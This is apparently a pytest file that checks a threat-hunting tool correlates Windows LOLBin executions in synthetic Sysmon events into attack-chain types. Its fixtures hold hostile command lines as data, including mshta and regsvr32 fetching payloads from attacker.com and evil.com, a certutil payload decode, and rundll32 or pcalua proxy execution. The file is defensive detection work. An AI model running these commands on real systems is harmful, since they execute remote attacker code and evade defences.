"""LOLBin detection enrichment tests — TDD RED phase.

Pass 4.5 correlates Sysmon EID 1 LOLBin executions with follow-on events
within a 60-second window and routes them into the correct existing chain type.

These tests will all FAIL until:
  1. schema.py  — StandardEvent gets `is_lolbin: bool = False`
  2. hunter.py  — build_attack_chains() gets Pass 4.5 LOLBin correlation
"""

import sys
from datetime import datetime, timezone, timedelta
from pathlib import Path

_src = str(Path(__file__).parent.parent / 'src')
if _src not in sys.path:
    sys.path.insert(0, _src)

from schema import StandardEvent, make_event_id
from hunter import build_attack_chains

_BASE_TS = datetime(2024, 6, 15, 12, 0, 0, tzinfo=timezone.utc)
LOLBIN_WINDOW_S = 60  # must match the constant in hunter.py Pass 4.5


def _ts(offset_seconds: float = 0.0) -> datetime:
    return _BASE_TS + timedelta(seconds=offset_seconds)


def _make_lolbin_event(
    command: str,
    offset_s: float = 0.0,
    mitre_id: str | None = None,
    mitre_name: str | None = None,
    user: str = 'VICTIM\\user1',
    severity: str = 'medium',
) -> StandardEvent:
    """Synthetic Sysmon EID 1 event for a LOLBin process."""
    exe = command.split()[0].lower()
    if not exe.endswith('.exe'):
        exe += '.exe'
    return StandardEvent(
        event_id=make_event_id(),
        timestamp=_ts(offset_s),
        event_type='Sysmon Process Created',
        source_actor={'ip': None, 'user': user},
        target_system={'hostname': 'VICTIM-PC', 'process': exe},
        action_taken=f'Process created: {command}',
        severity=severity,
        mitre_technique={'id': mitre_id, 'name': mitre_name},
        raw=f'<Event>{command}</Event>',
        source_log='sysmon.evtx',
        log_format='evtx',
        is_lolbin=True,
    )


def _make_followon_event(
    event_type: str,
    offset_s: float,
    user: str = 'VICTIM\\user1',
    ip: str | None = None,
    severity: str = 'high',
    process: str = 'unknown',
    mitre_id: str | None = None,
    mitre_name: str | None = None,
) -> StandardEvent:
    """Synthetic follow-on event (network, file, registry, process access)."""
    return StandardEvent(
        event_id=make_event_id(),
        timestamp=_ts(offset_s),
        event_type=event_type,
        source_actor={'ip': ip, 'user': user},
        target_system={'hostname': 'VICTIM-PC', 'process': process},
        action_taken=f'Follow-on: {event_type}',
        severity=severity,
        mitre_technique={'id': mitre_id, 'name': mitre_name},
        raw=f'<Event>{event_type}</Event>',
        source_log='sysmon.evtx',
        log_format='evtx',
        is_lolbin=False,
    )


# ── Test 1: mshta → child process ─────────────────────────────────────────────

def test_mshta_child_process_enriches_post_exploitation():
    """mshta.exe + child Sysmon Process Created within 60s → chain_type='post_exploitation'."""
    mshta = _make_lolbin_event(
        'mshta.exe http://attacker.com/payload.hta',
        offset_s=0,
        mitre_id='T1218.005',
        mitre_name='System Binary Proxy Execution: Mshta',
    )
    child_cmd = _make_followon_event(
        event_type='Sysmon Process Created',
        offset_s=30,
        process='cmd.exe',
        mitre_id='T1059.003',
        mitre_name='Command and Script Interpreter: Windows Command Shell',
    )

    chains = build_attack_chains([mshta, child_cmd], threshold=1)

    post_exploit_chains = [c for c in chains if c.chain_type == 'post_exploitation']
    assert post_exploit_chains, (
        f'Expected a post_exploitation chain; got chain types: '
        f'{[c.chain_type for c in chains]}'
    )
    chain = post_exploit_chains[0]
    chain_event_ids = {e.event_id for e in chain.events}
    assert mshta.event_id in chain_event_ids, 'mshta event missing from chain'
    assert child_cmd.event_id in chain_event_ids, 'child cmd.exe event missing from chain'

    technique_ids = {t['id'] for t in chain.mitre_techniques}
    assert 'T1218.005' in technique_ids, (
        f'T1218.005 (mshta) not in mitre_techniques: {technique_ids}'
    )


# ── Test 2: rundll32 → network pivot ──────────────────────────────────────────

def test_rundll32_network_pivot_enriches_lateral_movement():
    """rundll32.exe + Sysmon Network Connection to internal IP within 60s → 'lateral_movement'."""
    rundll32 = _make_lolbin_event(
        'rundll32.exe C:\\temp\\payload.dll,Export',
        offset_s=0,
        mitre_id='T1218.011',
        mitre_name='System Binary Proxy Execution: Rundll32',
    )
    net_conn = _make_followon_event(
        event_type='Sysmon Network Connection',
        offset_s=20,
        ip='10.0.0.5',
        process='rundll32.exe',
        mitre_id='T1071',
        mitre_name='Application Layer Protocol',
    )

    chains = build_attack_chains([rundll32, net_conn], threshold=1)

    lm_chains = [c for c in chains if c.chain_type == 'lateral_movement']
    assert lm_chains, (
        f'Expected a lateral_movement chain; got: {[c.chain_type for c in chains]}'
    )
    chain = lm_chains[0]
    chain_event_ids = {e.event_id for e in chain.events}
    assert rundll32.event_id in chain_event_ids, 'rundll32 event missing from chain'
    assert net_conn.event_id in chain_event_ids, 'network connection event missing from chain'


# ── Test 3: certutil → LSASS access ───────────────────────────────────────────

def test_certutil_lsass_access_enriches_credential_access():
    """certutil.exe + Sysmon Process Access (LSASS) within 60s → 'credential_access'."""
    certutil = _make_lolbin_event(
        'certutil.exe -decode payload.b64 payload.exe',
        offset_s=0,
        mitre_id='T1140',
        mitre_name='Deobfuscate/Decode Files or Information',
    )
    lsass_access = _make_followon_event(
        event_type='Sysmon Process Access',
        offset_s=45,
        process='lsass.exe',
        mitre_id='T1003.001',
        mitre_name='OS Credential Dumping: LSASS Memory',
    )

    chains = build_attack_chains([certutil, lsass_access], threshold=1)

    cred_chains = [c for c in chains if c.chain_type == 'credential_access']
    assert cred_chains, (
        f'Expected a credential_access chain; got: {[c.chain_type for c in chains]}'
    )
    chain = cred_chains[0]
    chain_event_ids = {e.event_id for e in chain.events}
    assert certutil.event_id in chain_event_ids, 'certutil event missing from chain'
    assert lsass_access.event_id in chain_event_ids, 'LSASS access event missing from chain'
    assert chain.compromised is True


# ── Test 4: regsvr32 → registry persistence ───────────────────────────────────

def test_regsvr32_registry_write_enriches_defense_evasion():
    """regsvr32.exe + Sysmon Registry Value Modified on autorun key within 60s → 'defense_evasion'."""
    regsvr32 = _make_lolbin_event(
        'regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll',
        offset_s=0,
        mitre_id='T1218.010',
        mitre_name='System Binary Proxy Execution: Regsvr32',
    )
    reg_write = _make_followon_event(
        event_type='Sysmon Registry Value Modified',
        offset_s=15,
        process='regsvr32.exe',
        mitre_id='T1547.001',
        mitre_name='Boot or Logon Autostart: Registry Run Keys',
    )

    chains = build_attack_chains([regsvr32, reg_write], threshold=1)

    de_chains = [c for c in chains if c.chain_type == 'defense_evasion']
    assert de_chains, (
        f'Expected a defense_evasion chain; got: {[c.chain_type for c in chains]}'
    )
    chain = de_chains[0]
    chain_event_ids = {e.event_id for e in chain.events}
    assert regsvr32.event_id in chain_event_ids, 'regsvr32 event missing from chain'
    assert reg_write.event_id in chain_event_ids, 'registry write event missing from chain'


# ── Test 5: outside 60s window → events not correlated ────────────────────────

def test_lolbin_outside_window_events_not_correlated():
    """mshta.exe + child process 61s later → must NOT appear in the same chain."""
    mshta = _make_lolbin_event(
        'mshta.exe http://attacker.com/payload.hta',
        offset_s=0,
        mitre_id='T1218.005',
        mitre_name='System Binary Proxy Execution: Mshta',
    )
    late_child = _make_followon_event(
        event_type='Sysmon Process Created',
        offset_s=LOLBIN_WINDOW_S + 1,  # 61s — just outside the window
        process='cmd.exe',
    )

    chains = build_attack_chains([mshta, late_child], threshold=1)

    for chain in chains:
        chain_ids = {e.event_id for e in chain.events}
        assert not (mshta.event_id in chain_ids and late_child.event_id in chain_ids), (
            f'Events 61s apart must not be correlated (window={LOLBIN_WINDOW_S}s); '
            f'chain_type={chain.chain_type}'
        )


# ── Test 6: discovery LOLBins alone → no chain ────────────────────────────────

def test_discovery_lolbin_alone_produces_no_chain():
    """whoami, ipconfig, tasklist with no follow-on → no attack chains created."""
    whoami = _make_lolbin_event(
        'whoami.exe', offset_s=0,
        mitre_id='T1033', mitre_name='System Owner/User Discovery',
    )
    ipconfig = _make_lolbin_event(
        'ipconfig.exe', offset_s=5,
        mitre_id='T1016', mitre_name='System Network Configuration Discovery',
    )
    tasklist = _make_lolbin_event(
        'tasklist.exe', offset_s=10,
        mitre_id='T1057', mitre_name='Process Discovery',
    )

    chains = build_attack_chains([whoami, ipconfig, tasklist], threshold=1)

    assert not chains, (
        f'Discovery-only LOLBins with no follow-on must produce no chains; '
        f'got {len(chains)} chain(s): {[c.chain_type for c in chains]}'
    )


# ── Test 7a: is_lolbin defaults to False ──────────────────────────────────────

def test_standard_event_is_lolbin_defaults_false():
    """StandardEvent must have is_lolbin: bool = False as an optional field."""
    event = StandardEvent(
        event_id=make_event_id(),
        timestamp=_ts(),
        event_type='Sysmon Process Created',
        source_actor={'ip': None, 'user': 'testuser'},
        target_system={'hostname': 'HOST', 'process': 'cmd.exe'},
        action_taken='cmd.exe /c whoami',
        severity='low',
        mitre_technique={'id': None, 'name': None},
        raw='<raw/>',
        source_log='sysmon.evtx',
        log_format='evtx',
        # is_lolbin intentionally omitted — must default to False
    )
    assert hasattr(event, 'is_lolbin'), 'StandardEvent is missing the is_lolbin field'
    assert event.is_lolbin is False, (
        f'Expected is_lolbin=False by default, got {event.is_lolbin!r}'
    )


# ── Test 7b: is_lolbin can be set True ────────────────────────────────────────

def test_standard_event_is_lolbin_can_be_set_true():
    """is_lolbin=True must be accepted on StandardEvent without error."""
    event = StandardEvent(
        event_id=make_event_id(),
        timestamp=_ts(),
        event_type='Sysmon Process Created',
        source_actor={'ip': None, 'user': 'testuser'},
        target_system={'hostname': 'HOST', 'process': 'mshta.exe'},
        action_taken='mshta.exe http://evil.com/payload.hta',
        severity='high',
        mitre_technique={'id': 'T1218.005', 'name': 'Mshta'},
        raw='<raw/>',
        source_log='sysmon.evtx',
        log_format='evtx',
        is_lolbin=True,
    )
    assert event.is_lolbin is True


# ── Phase 2: Standalone suspicious argument pattern detection ──────────────────
# These tests validate that LOLBin process executions with no follow-on events
# still create a chain when the command line matches a known suspicious pattern.
# (e.g. mshta launching a URL, rundll32 with proxy DLLs, pcalua -a)
#
# Pass 4.5 extension: if no follow-on found AND cmdline matches _SUSPICIOUS_ARG_PATTERNS
# → create a 'defense_evasion' chain for the standalone LOLBin.


def _make_standalone_lolbin(
    cmdline: str,
    offset_s: float = 0.0,
    mitre_id: str | None = 'T1218',
    mitre_name: str | None = 'System Binary Proxy Execution',
) -> StandardEvent:
    """LOLBin event where source_actor['user'] holds the full command line.

    Matches how sysmon_evtx.py stores the command line in the 'user' column
    of the DataFrame (discovered from EVTX DataFrame inspection).
    """
    exe = cmdline.split()[0].split('\\')[-1].lower()
    if not exe.endswith('.exe'):
        exe += '.exe'
    return StandardEvent(
        event_id=make_event_id(),
        timestamp=_ts(offset_s),
        event_type='Sysmon Process Created',
        source_actor={'ip': None, 'user': cmdline},
        target_system={'hostname': 'VICTIM-PC', 'process': exe},
        action_taken=f'Process created: {cmdline}',
        severity='medium',
        mitre_technique={'id': mitre_id, 'name': mitre_name},
        raw=f'<Event>{cmdline}</Event>',
        source_log='sysmon.evtx',
        log_format='evtx',
        is_lolbin=True,
    )


def test_standalone_mshta_url_creates_chain():
    """mshta.exe http://attacker.com with no follow-on → defense_evasion chain."""
    mshta = _make_standalone_lolbin(
        'mshta.exe http://attacker.com/payload.hta',
        mitre_id='T1218.005',
        mitre_name='System Binary Proxy Execution: Mshta',
    )

    chains = build_attack_chains([mshta], threshold=1)

    assert chains, 'Expected a chain for standalone mshta with URL, got none'
    chain = chains[0]
    assert chain.chain_type == 'defense_evasion', (
        f'Expected defense_evasion, got {chain.chain_type}'
    )
    assert mshta.event_id in {e.event_id for e in chain.events}


def test_standalone_rundll32_advpack_creates_chain():
    """rundll32.exe advpack.dll,RegisterOCX with no follow-on → defense_evasion chain."""
    rundll32 = _make_standalone_lolbin(
        'rundll32.exe advpack.dll,RegisterOCX C:\\malware.inf',
        mitre_id='T1218.011',
        mitre_name='System Binary Proxy Execution: Rundll32',
    )

    chains = build_attack_chains([rundll32], threshold=1)

    assert chains, 'Expected a chain for standalone rundll32 with advpack.dll, got none'
    assert chains[0].chain_type == 'defense_evasion', (
        f'Expected defense_evasion, got {chains[0].chain_type}'
    )


def test_standalone_rundll32_pcwutl_creates_chain():
    """rundll32.exe pcwutl.dll,LaunchApplication with no follow-on → defense_evasion chain."""
    rundll32 = _make_standalone_lolbin(
        'rundll32.exe pcwutl.dll,LaunchApplication C:\\malware.exe',
        mitre_id='T1218.011',
        mitre_name='System Binary Proxy Execution: Rundll32',
    )

    chains = build_attack_chains([rundll32], threshold=1)

    assert chains, 'Expected a chain for standalone rundll32 with pcwutl.dll, got none'
    assert chains[0].chain_type == 'defense_evasion', (
        f'Expected defense_evasion, got {chains[0].chain_type}'
    )


def test_standalone_pcalua_creates_chain():
    """pcalua.exe -a calc.exe with no follow-on → defense_evasion chain."""
    pcalua = _make_standalone_lolbin(
        'pcalua.exe -a calc.exe',
        mitre_id='T1218',
        mitre_name='System Binary Proxy Execution',
    )

    chains = build_attack_chains([pcalua], threshold=1)

    assert chains, 'Expected a chain for standalone pcalua -a, got none'
    assert chains[0].chain_type == 'defense_evasion', (
        f'Expected defense_evasion, got {chains[0].chain_type}'
    )


def test_standalone_legitimate_rundll32_no_chain():
    """rundll32.exe shell32.dll,Control_RunDLL (benign pattern) → no chain created."""
    rundll32 = _make_standalone_lolbin(
        'rundll32.exe shell32.dll,Control_RunDLL',
        mitre_id='T1218.011',
        mitre_name='System Binary Proxy Execution: Rundll32',
    )

    chains = build_attack_chains([rundll32], threshold=1)

    assert not chains, (
        f'Legitimate rundll32 must not produce a chain; got {len(chains)} chain(s): '
        f'{[c.chain_type for c in chains]}'
    )
